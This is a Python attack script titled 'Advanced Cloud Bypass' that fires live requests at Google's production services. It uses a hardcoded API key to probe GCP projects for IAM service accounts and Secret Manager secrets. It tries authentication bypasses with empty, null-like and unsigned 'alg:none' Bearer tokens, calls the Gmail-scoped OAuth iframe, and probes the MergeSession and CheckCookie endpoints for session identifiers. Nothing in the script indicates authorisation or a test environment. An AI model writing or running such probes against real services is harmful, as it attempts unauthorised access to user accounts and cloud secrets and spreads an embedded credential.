import requests, json

print('=== TRACK K: ADVANCED CLOUD BYPASS ===')

# 1. Google's own GCP project IDs we found
projects = ['105485638270503736680', '111647807989099543274', '1080792431816']
api_key = 'AIzaSyA6RHlWHTfUEqMzdfQQQSmugsGcoDIxnAg'

print('1. GCP Project API probes')
for pid in projects:
    endpoints = [
        f'https://cloudresourcemanager.googleapis.com/v1/projects/{pid}?key={api_key}',
        f'https://iam.googleapis.com/v1/projects/{pid}/serviceAccounts?key={api_key}',
        f'https://secretmanager.googleapis.com/v1/projects/{pid}/secrets?key={api_key}',
    ]
    for ep in endpoints:
        r = requests.get(ep, timeout=10)
        print(f'  {ep.split("?")[0].split("/")[-1]} - HTTP {r.status_code} {r.text[:120]}')

# 2. Try Bearer token with empty token
print()
print('2. Empty Bearer token')
r = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': 'Bearer '}, timeout=10)
print(f'  HTTP {r.status_code}: {r.text[:200]}')

# 3. Try string 'null' / 'undefined' / 'none' as Bearer token
print()
print('3. Edge case Bearer tokens')
for tok in ['null', 'undefined', 'none', '0', 'false', 'true', 'Bearer']:
    r = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': f'Bearer {tok}'}, timeout=10)
    print(f'  Bearer {tok}: HTTP {r.status_code} {r.text[:150]}')

# 4. Try Google APIs with JWT format tokens
print()
print('4. JWT-format Bearer tokens')
# These might be parsed differently by Google's auth middleware
jwts = [
    'eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0QGdtYWlsLmNvbSJ9.',
    'eyJhbGciOiJSUzI1NiIsImtpZCI6InRlc3QifQ.eyJzdWIiOiJ0ZXN0QGdtYWlsLmNvbSJ9.fake',
]
for jwt in jwts:
    r = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': f'Bearer {jwt}'}, timeout=10)
    print(f'  JWT: HTTP {r.status_code} {r.text[:150]}')

# 5. Try the OAuth iframe with postMessage
print()
print('5. GSI iframe token request via direct API')
# The GSI iframe accepts these postMessage types
# We can simulate this by calling the iframe endpoint directly
r = requests.get('https://accounts.google.com/o/oauth2/iframe', params={
    'origin': 'https://mail.google.com',
    'client_id': '77185425430.apps.googleusercontent.com',
    'scope': 'https://mail.google.com/',
}, timeout=10)
print(f'  HTTP {r.status_code} ({len(r.text)} bytes)')
print(f'  Body: {r.text[:400]}')

# 6. Check if MergeSession can be exploited
print()
print('6. MergeSession with crafted params')
s = requests.Session()
s.get('https://accounts.google.com', timeout=10)  # Get initial cookies
r = s.get('https://accounts.google.com/MergeSession', params={
    'continue': 'https://accounts.google.com/o/oauth2/auth',
    'source': 'web',
    'service': 'mail'
}, timeout=10)
print(f'  HTTP {r.status_code} ({len(r.text)} bytes)')
print(f'  Response: {r.text[:300]}')

# 7. CheckCookie with specific params
print()
print('7. CheckCookie probe')
r = s.get('https://accounts.google.com/CheckCookie', params={
    'service': 'mail',
    'continue': 'https://mail.google.com/mail/',
    'checked': 'true'
}, timeout=10)
print(f'  HTTP {r.status_code} ({len(r.text)} bytes)')
if 'SID' in r.text or 'LSID' in r.text or 'Token' in r.text:
    print(f'  Cookies/SIDs found in response!')
    print(f'  Response: {r.text[:400]}')
